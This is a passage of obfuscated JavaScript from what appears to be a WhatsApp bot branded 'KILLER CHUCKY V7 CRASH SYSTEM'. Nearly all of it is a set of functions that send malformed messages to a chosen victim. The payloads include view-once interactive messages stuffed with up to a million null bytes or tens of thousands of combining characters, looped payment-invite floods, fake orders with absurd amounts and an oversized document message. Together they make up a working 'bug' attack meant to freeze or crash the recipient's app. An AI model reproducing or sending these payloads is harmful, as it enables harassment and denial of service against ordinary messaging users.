        quoted: _0x78a985
      });
      await _0x4b53e5.relayMessage(_0x366402, _0x4f1495.message, {
        participant: {
          jid: _0x366402
        },
        messageId: _0x4f1495.key.id
      });
    }
    async function _0x450464(_0x6ddddd) {
      var _0x5e6e22 = generateWAMessageFromContent(_0x6ddddd, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                subtitle: " "
              },
              body: {
                text: "🩸⃟༑⌁⃰⃰𝐊𝐈𝐋𝐋𝐄𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝐕𝟕🐉 𝐌𝐎𝐃𝐒 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏"
              },
              footer: {
                text: "xp"
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: "{ display_text : '🩸⃟༑⌁⃰⃰𝐊𝐈𝐋𝐋𝐄𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝐕𝟕🐉 𝐌𝐎𝐃𝐒 𝐖𝐇𝐀𝐓𝐒𝐀𝐏𝐏', url : , merchant_url :  }"
                }],
                messageParamsJson: "\0".repeat(4240)
              }
            }
          }
        }
      }), {
        userJid: _0x6ddddd
      });
      await _0x4b53e5.relayMessage(_0x6ddddd, _0x5e6e22.message, {
        participant: {
          jid: _0x6ddddd
        },
        messageId: _0x5e6e22.key.id
      });
    }
    async function _0x3e1634(_0x273494) {
      for (let _0x350fad = 0; _0x350fad < 2; _0x350fad++) {
        try {
          await _0x4b53e5.relayMessage(_0x273494, {
            viewOnceMessage: {
              message: {
                messageContextInfo: {
                  deviceListMetadataVersion: 0,
                  deviceListMetadata: {}
                },
                interactiveMessage: {
                  nativeFlowMessage: {
                    buttons: [{
                      name: "payment_info",
                      buttonParamsJson: JSON.stringify({
                        currency: "",
                        total_amount: {
                          value: "invalid_string",
                          offset: 2
                        },
                        reference_id: null,
                        type: "physical-goods",
                        order: {
                          status: "pending",
                          subtotal: {
                            value: 0,
                            offset: 2
                          },
                          order_type: "ORDER",
                          items: [{
                            name: "",
                            amount: {
                              value: 0,
                              offset: 2
                            },
                            quantity: 0,
                            sale_amount: {
                              value: 0,
                              offset: 2
                            }
                          }]
                        },
                        payment_settings: [{
                          type: "pix_static_code",
                          pix_static_code: {
                            merchant_name: "",
                            key: null,
                            key_type: ""
                          }
                        }]
                      })
                    }]
                  }
                }
              }
            }
          }, {
            participant: {
              jid: _0x273494
            }
          }, {
            messageId: null
          });
          console.log("Bug 🩸⃟༑⌁⃰⃰𝐊𝐈𝐋𝐋𝐄𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝐕𝟕🐉 Pasti C1 Nih Contohnya " + _0x273494 + " Cek aja (" + (_0x350fad + 1) + "/2");
          await new Promise(_0x83fc99 => setTimeout(_0x83fc99, 10000));
        } catch (_0x4a5f5e) {
          console.error("Error sending payment info message:", _0x4a5f5e);
          break;
        }
      }
    }
    async function _0x3f9be3(_0xfceef7) {
      let _0x58ebc0 = generateWAMessageFromContent(_0xfceef7, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            scheduledCallCreationMessage: {
              scheduledTimestampMs: Date.now(),
              callType: 2,
              title: ""
            }
          }
        }
      }), {
        userJid: _0xfceef7
      });
      await _0x4b53e5.relayMessage(_0xfceef7, _0x58ebc0.message, {});
    }
    async function _0x30b939(_0x32679c, _0xe5aedd) {
      var _0xa01135 = generateWAMessageFromContent(_0x32679c, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            liveLocationMessage: {
              degreesLatitude: "p",
              degreesLongitude: "p",
              caption: "𝚔𝚎𝚒𝚜𝚎𝚛𝚣̥𝚣̥ͦ  C̥ͦR̥ͦḀͦS̥ͦH̥ͦ  S̥ͦY̥ͦS̥ͦT̥ͦE̥ͦM" + "ꦾ".repeat(50000),
              sequenceNumber: "0",
              jpegThumbnail: ""
            }
          }
        }
      }), {
        userJid: _0x32679c,
        quoted: _0xe5aedd
      });
      await _0x4b53e5.relayMessage(_0x32679c, _0xa01135.message, {
        participant: {
          jid: _0x32679c
        },
        messageId: _0xa01135.key.id
      });
    }
    async function _0x38caf8(_0x439cda) {
      var _0x48c26f = generateWAMessageFromContent(_0x439cda, proto.Message.fromObject({
        listMessage: {
          title: "🩸⃟༑⌁⃰⃰𝐊𝐈𝐋𝐋𝐄𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝐕𝟕 C̥ͦR̥ͦḀͦS̥ͦH̥ͦ  S̥ͦY̥ͦS̥ͦT̥ͦE̥ͦM" + "\0".repeat(920000),
          footerText: "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
          description: "àº®â‚®à½žà¸¨Vê™°à¸¨ à¹–àº¡Gê™°à½€Í¡Íœâœ…âƒŸâ•®",
          buttonText: null,
          listType: 2,
          productListInfo: {
            productSections: [{
              title: "lol",
              products: [{
                productId: "4392524570816732"
              }]
            }],
            productListHeaderImage: {
              productId: "4392524570816732",
              jpegThumbnail: null
            },
            businessOwnerJid: "0@s.whatsapp.net"
          }
        },
        footer: "lol",
        contextInfo: {
          expiration: 600000,
          ephemeralSettingTimestamp: "1679959486",
          entryPointConversionSource: "global_search_new_chat",
          entryPointConversionApp: "whatsapp",
          entryPointConversionDelaySeconds: 9,
          disappearingMode: {
            initiator: "INITIATED_BY_ME"
          }
        },
        selectListType: 2,
        product_header_info: {
          product_header_info_id: 292928282928,
          product_header_is_rejected: false
        }
      }), {
        userJid: _0x439cda
      });
      await _0x4b53e5.relayMessage(_0x439cda, _0x48c26f.message, {
        participant: {
          jid: _0x439cda
        },
        messageId: _0x48c26f.key.id
      });
    }
    const _0x590e28 = "🔥⃰͜͡⭑𝐕𝐱͢𝐎⭑͜͡🔥⃰" + "\0".repeat(50000);
    async function _0x48b463(_0x5a9b45) {
      var _0x1fd90b = generateWAMessageFromContent(_0x5a9b45, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            newsletterAdminInviteMessage: {
              newsletterJid: "120363298524333143@newsletter",
              newsletterName: "🚫⃰͜͡⭑𝐓𝐝͢𝐗⭑͜͡🚫⃰" + "\0".repeat(920000),
              jpegThumbnail: "",
              caption: "🩸⃟༑⌁⃰⃰𝐊𝐈𝐋𝐋𝐄𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝐕𝟕🐉",
              inviteExpiration: Date.now() + 1814400000
            }
          }
        }
      }), {
        userJid: _0x5a9b45
      });
      await _0x4b53e5.relayMessage(_0x5a9b45, _0x1fd90b.message, {
        participant: {
          jid: _0x5a9b45
        },
        messageId: _0x1fd90b.key.id
      });
    }
    async function _0x1647f1(_0x4b3660) {
      await _0x4b53e5.relayMessage(_0x4b3660, {
        paymentInviteMessage: {
          serviceType: "FBPAY",
          expiryTimestamp: Date.now() + 1814400000
        }
      }, {});
      _0x96020a(200);
      await _0x4b53e5.relayMessage(_0x4b3660, {
        paymentInviteMessage: {
          serviceType: "FBPAY",
          expiryTimestamp: Date.now() + 1814400000
        }
      }, {
        participant: {
          jid: _0x4b3660
        }
      });
      _0x96020a(200);
      await _0x4b53e5.relayMessage(_0x4b3660, {
        paymentInviteMessage: {
          serviceType: "FBPAY",
          expiryTimestamp: Date.now() + 1814400000
        }
      }, {});
    }
    async function _0x251533(_0xcb8c06, _0x515297, _0x47e84a, _0x14200b, _0x26a1e1, _0x167ab1, _0x3c5a5c, _0x45ef9c) {
      const _0x166b9d = {
        filterName: _0x515297,
        parameters: _0x47e84a,
        filterResult: _0x14200b,
        clientNotSupportedConfig: _0x26a1e1
      };
      const _0x1dfb15 = {
        clauseType: _0x167ab1,
        clauses: _0x3c5a5c,
        filters: _0x45ef9c
      };
      const _0x1d3f2e = {
        filter: _0x166b9d,
        filterClause: _0x1dfb15
      };
      const _0x2ad1af = {
        qp: _0x1d3f2e
      };
      var _0x56ad98 = generateWAMessageFromContent(_0xcb8c06, proto.Message.fromObject(_0x2ad1af), {
        userJid: _0xcb8c06
      });
      await _0x4b53e5.relayMessage(_0xcb8c06, _0x56ad98.message, {
        participant: {
          jid: _0xcb8c06
        },
        messageId: _0x56ad98.key.id
      });
    }
    async function _0xcb3ebe(_0x2798fe, _0x5078e5, _0x112b5a, _0x35fe20, _0x352012, _0x2f6093, _0x304e82, _0x17943f, _0x3ac82d, _0x31fd32, _0x3e38a2, _0x3b415, _0x214d42, _0x312618) {
      const _0xe17b48 = {
        sessionVersion: _0x5078e5,
        localIdentityPublic: _0x112b5a,
        remoteIdentityPublic: _0x35fe20,
        rootKey: _0x352012,
        previousCounter: _0x2f6093,
        senderChain: _0x304e82,
        receiverChains: _0x17943f,
        pendingKeyExchange: _0x3ac82d,
        pendingPreKey: _0x31fd32,
        remoteRegistrationId: _0x3e38a2,
        localRegistrationId: _0x3b415,
        needsRefresh: _0x214d42,
        aliceBaseKey: _0x312618
      };
      const _0xe2b28b = {
        sessionStructure: _0xe17b48
      };
      var _0x1226fa = generateWAMessageFromContent(_0x2798fe, proto.Message.fromObject(_0xe2b28b), {
        userJid: _0x2798fe
      });
      await _0x4b53e5.relayMessage(_0x2798fe, _0x1226fa.message, {
        participant: {
          jid: _0x2798fe
        },
        messageId: _0x1226fa.key.id
      });
    }
    const _0x48b0ff = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "status@broadcast"
      },
      message: {
        orderMessage: {
          orderId: "999999999999",
          thumbnail: null,
          itemCount: 999999999999,
          status: "INQUIRY",
          surface: "CATALOG",
          message: "▾🩸⃟༑⌁⃰⃰𝐊𝐈𝐋𝐋𝐄𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝐕𝟕𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭 ▾",
          token: "AR6xBKbXZn0Xwmu76Ksyd7rnxI+Rx87HfinVlW4lwXa6JA=="
        }
      },
      contextInfo: {
        mentionedJid: ["27746135260@s.whatsapp.net"],
        forwardingScore: 999,
        isForwarded: true
      }
    };
    const _0x123f93 = {
      participant: "0@s.whatsapp.net",
      ...(_0x21f0d9.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x422542 = {
      key: _0x123f93,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: _0x4d1a4f.readFileSync("./marx/anjay.jpg")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰⃰𝐊𝐈𝐋𝐋𝐄𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝐕𝟕\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    const _0x4c447c = {
      participant: "0@s.whatsapp.net",
      ...(_0x21f0d9.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x28ca96 = {
      key: _0x4c447c,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: _0x4d1a4f.readFileSync("./marx/anjay.jpg")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"️࿆᷍🩸⃟༑⌁⃰⃰𝐊𝐈𝐋𝐋𝐄𝐑 𝐂𝐇𝐔𝐂𝐊𝐘 𝐕𝟕\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    const _0x156993 = {
      participant: "0@s.whatsapp.net",
      ...(_0x21f0d9.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x359358 = {
      key: _0x156993,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: _0x4d1a4f.readFileSync("./lib/image/virgam.png")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"USD\",\"payment_configuration\":\"\",\"payment_type\":\"\",\"transaction_id\":\"\",\"total_amount\":{\"value\":879912500,\"offset\":100},\"reference_id\":\"4N88TZPXWUM\",\"type\":\"physical-goods\",\"payment_method\":\"\",\"order\":{\"status\":\"pending\",\"description\":\"\",\"subtotal\":{\"value\":990000000,\"offset\":100},\"tax\":{\"value\":8712000,\"offset\":100},\"discount\":{\"value\":118800000,\"offset\":100},\"shipping\":{\"value\":500,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\",\"name\":\"JAMUR\",\"amount\":{\"value\":1000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\",\"name\":\"Wortel\",\"amount\":{\"value\":5000000,\"offset\":100},\"quantity\":99},{\"retailer_id\":\"custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\",\"name\":\"𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕\",\"amount\":{\"value\":4000000,\"offset\":100},\"quantity\":99}]},\"additional_note\":\"\"}"
            }]
          }
        }
      }
    };
    async function _0x5c7d9e(_0x3e6120, _0x2fd1a3) {
      var _0x329a29 = generateWAMessageFromContent(_0x3e6120, proto.Message.fromObject({
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true",
          fileSha256: "CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=",
          fileEncSha256: "r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=",
          mediaKey: "4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=",
          mimetype: "image/webp",
          directPath: "/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000",
          fileLength: "10116",
          mediaKeyTimestamp: "1715876003",
          isAnimated: false,
          stickerSentTs: "1715881084144",
          isAvatar: false,
          isAiSticker: false,
          isLottie: false
        }
      }), {
        userJid: _0x3e6120,
        quoted: _0x2fd1a3
      });
      await _0x4b53e5.relayMessage(_0x3e6120, _0x329a29.message, {
        participant: {
          jid: _0x3e6120
        },
        messageId: _0x329a29.key.id
      });
    }
    async function _0x2ca055(_0x50bfef) {
      let _0x2d00fb = generateWAMessageFromContent(_0x50bfef, {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
              body: proto.Message.InteractiveMessage.Body.create({
                text: ""
              }),
              footer: proto.Message.InteractiveMessage.Footer.create({
                text: ""
              }),
              header: proto.Message.InteractiveMessage.Header.create({
                title: "",
                subtitle: "",
                hasMediaAttachment: false
              }),
              nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: "{\"display_text\":\"à¾§\".repeat(50000),\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}"
                }],
                messageParamsJson: "\0".repeat(100000)
              })
            })
          }
        }
      }, {});
      _0x4b53e5.relayMessage(_0x50bfef, _0x2d00fb.message, {
        messageId: _0x2d00fb.key.id
      });
    }
    async function _0x28408d(_0x5083b6) {
      await _0x4b53e5.relayMessage(_0x5083b6, {
        paymentInviteMessage: {
          serviceType: "UPI",
          expiryTimestamp: Date.now() + 86400000
        }
      }, {
        participant: {
          jid: _0x5083b6
        }
      });
    }
    async function _0x220dee(_0xa1027b) {
      await _0x4b53e5.relayMessage(_0xa1027b, {
        paymentInviteMessage: {
          serviceType: "galaxy_message",
          expiryTimestamp: Date.now() + 86400000000
        }
      }, {
        participant: {
          jid: _0xa1027b
        }
      });
    }
    async function _0x50b79c(_0x572020) {
      await _0x4b53e5.relayMessage(_0x572020, {
        paymentInviteMessage: {
          serviceType: "POLLING",
          expiryTimestamp: Date.now() + 86400000000
        }
      }, {
        participant: {
          jid: _0x572020
        }
      });
    }
    async function _0x50de4f(_0xb0e0d8) {
      await _0x4b53e5.relayMessage(_0xb0e0d8, {
        paymentInviteMessage: {
          serviceType: "FBPAY",
          expiryTimestamp: Date.now() + 1814400000
        }
      }, {
        participant: {
          jid: _0xb0e0d8
        }
      });
    }
    async function _0x4fbc32(_0x5c55a9) {
      _0x4b53e5.relayMessage(_0x5c55a9, {
        extendedTextMessage: {
          text: ".",
          contextInfo: {
            stanzaId: _0x5c55a9,
            participant: _0x5c55a9,
            quotedMessage: {
              conversation: "؂ن؃؄ٽ؂ن؃؄ٽ" + "ꦾ".repeat(50000)
            },
            disappearingMode: {
              initiator: "CHANGED_IN_CHAT",
              trigger: "CHAT_SETTING"
            }
          },
          inviteLinkGroupTypeV2: "DEFAULT"
        }
      }, {
        participant: {
          jid: _0x5c55a9
        }
      }, {
        messageId: null
      });
    }
    async function _0x5fb5e9(_0x16bff6) {
      _0x4b53e5.relayMessage(_0x16bff6, {
        paymentInviteMessage: {
          serviceType: "UPI",
          expiryTimestamp: Date.now() + 86400000
        }
      }, {
        participant: {
          jid: _0x16bff6
        }
      });
    }
    async function _0x72fe09(_0xf9f1c8, _0x14b7e9) {
      for (let _0x4a14e5 = 0; _0x4a14e5 < _0x14b7e9; _0x4a14e5++) {
        _0x5fb5e9(_0xf9f1c8);
        _0x4fbc32(_0xf9f1c8);
        await _0x96020a(500);
      }
    }
    async function _0x1dbb3f(_0x25123d) {
      var _0x1edb1d = generateWAMessageFromContent(_0x25123d, proto.Message.fromObject({
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              header: {
                title: "",
                subtitle: " "
              },
              body: {
                text: "𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
              },
              footer: {
                text: "xp"
              },
              nativeFlowMessage: {
                buttons: [{
                  name: "cta_url",
                  buttonParamsJson: "{ display_text : '𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕', url : , merchant_url :  }"
                }],
                messageParamsJson: "\0".repeat(1000000)
              }
            }
          }
        }
      }), {
        userJid: _0x25123d
      });
      await _0x4b53e5.relayMessage(_0x25123d, _0x1edb1d.message, {
        participant: {
          jid: _0x25123d
        },
        messageId: _0x1edb1d.key.id
      });
    }
    const _0xf34c97 = {
      participant: "0@s.whatsapp.net",
      ...(_0x21f0d9.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x28a3bf = {
      key: _0xf34c97,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: _0x4d1a4f.readFileSync("./69/xx1.png")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",\"name\":\"🦄드림 가이 Xeon 🦄드림 가이 Xeon 🦄드림 가이 Xeon\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    const _0x4a111d = {
      participant: "0@s.whatsapp.net",
      ...(_0x21f0d9.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x5c553c = {
      text: "Msg " + (_0x21f0d9.body || _0x21f0d9.mtype)
    };
    const _0xbac1b7 = {
      extendedTextMessage: _0x5c553c
    };
    const _0x46b357 = {
      currencyCodeIso4217: "USD",
      amount1000: 999,
      requestFrom: "0@s.whatsapp.net",
      noteMessage: _0xbac1b7,
      expiryTimestamp: 999999999,
      amount: {}
    };
    _0x46b357.amount.value = 91929291929;
    _0x46b357.amount.offset = 1000;
    _0x46b357.amount.currencyCode = "INR";
    const _0x4f2471 = {
      requestPaymentMessage: _0x46b357
    };
    const _0x4c297b = {
      key: _0x4a111d,
      message: _0x4f2471
    };
    const _0x523c7f = _0x4c297b;
    async function _0x64eff0(_0xb0f549) {
      await _0x4b53e5.relayMessage(_0xb0f549, {
        paymentInviteMessage: {
          serviceType: "FBPAY",
          expiryTimestamp: Date.now() + 1814400000
        }
      }, {
        participant: {
          jid: _0xb0f549
        }
      });
    }
    const _0x362442 = {
      participant: "0@s.whatsapp.net",
      ...(_0x21f0d9.chat ? {
        remoteJid: "status@broadcast"
      } : {})
    };
    const _0x556ba8 = {
      key: _0x362442,
      message: {
        interactiveMessage: {
          header: {
            hasMediaAttachment: true,
            jpegThumbnail: _0x4d1a4f.readFileSync("./lib/image/latx.png")
          },
          nativeFlowMessage: {
            buttons: [{
              name: "review_and_pay",
              buttonParamsJson: "{\"currency\":\"IDR\",\"total_amount\":{\"value\":49981399788,\"offset\":100},\"reference_id\":\"4OON4PX3FFJ\",\"type\":\"physical-goods\",\"order\":{\"status\":\"payment_requested\",\"subtotal\":{\"value\":49069994400,\"offset\":100},\"tax\":{\"value\":490699944,\"offset\":100},\"discount\":{\"value\":485792999999,\"offset\":100},\"shipping\":{\"value\":48999999900,\"offset\":100},\"order_type\":\"ORDER\",\"items\":[{\"retailer_id\":\"7842674605763435\",\"product_id\":\"7842674605763435\",,\"name\":\"✳️᜴࿆͆᷍MODS CRASH╮⭑ 乂⃰͜͡؜𝐙𝕩𝐕⃟⭐️᜴ # 《《   ֎ ⃢☠️☠️ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁴》》\n_*██ 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 ██*_ \n𖣘𝓜꙰⃢⃠⃠⃠⃠⃠*_🇲🇾⁘̨̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̤̽̈\n*ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̊̊̔̔̔̔̔̔ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕ɱ̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫⃟⃢꙰̯̯̯̯̯̯̯̯๎̯๎̯ࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩࣩ͌͌͌͌͌͌͌͌͌͌͌͌𝗮̨̫̫̫̫̫̫̪̪̪̪̪̪̪̪̪̫̪̫̫̫̫̫̫̫̫̫⃟꙰𝗰̴̴̴̴̴̴̴̛̛̛̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̜̜̜̜̜̜̬̬̬̩̱̱̇̓̓̓̓̓̓̔̔̔̎̎̎̊̊̊̕꙰𝗶̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̫̈⃟⃢̦̦̦̦̦̦̦̦̦̦̦̦̕˺̴̴̤̤̜̤̖̣̬̬̬̞̞̱̩̬̝̝̓̓̔̔̔̔̊̊̎̎̎̔̕꙰�˺꙰*˺̴̴̴̤̤̤̤̤̤̤̤̤̞̞̞̞̞̞̞̞̬̣̣̣̣̜̜̊̊̔̔̔̔̔̔̕*\n\n𝗗𝗮𝘀𝗮𝗿 \n𝙂𝙄𝙏𝙐 𝘼𝙅𝘼 𝙋𝘼𝙉𝙄𝙆🗿\n𝘽𝙐𝙆𝘼𝙉 𝙑𝙄𝙍𝙏𝙀𝙓 𝘼𝙎𝙇𝙄⃟╮\",\"amount\":{\"value\":9999900,\"offset\":100},\"quantity\":7},{\"retailer_id\":\"custom-item-f22115f9-478a-487e-92c1-8e7b4bf16de8\",\"name\":\"\",\"amount\":{\"value\":999999900,\"offset\":100},\"quantity\":49}]},\"native_payment_methods\":[]}"
            }]
          }
        }
      }
    };
    async function _0x21f01c(_0x14a412, _0x48bcdd) {
      var _0x9442f1 = generateWAMessageFromContent(_0x14a412, proto.Message.fromObject({
        documentMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
          mimetype: "penis",
          fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
          fileLength: "999999999",
          pageCount: 999999999,
          mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
          fileName: "𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕 DOCUMENT" + "ྦྷ".repeat(60000),
          fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
          directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
          mediaKeyTimestamp: "1715880173"
        }
      }), {
        userJid: _0x14a412,
        quoted: _0x48bcdd
      });
      await _0x4b53e5.relayMessage(_0x14a412, _0x9442f1.message, {
        participant: {
          jid: _0x14a412
        },
        messageId: _0x9442f1.key.id
      });
    }
    async function _0x150ef5(_0x2d2458, _0x3327a3) {
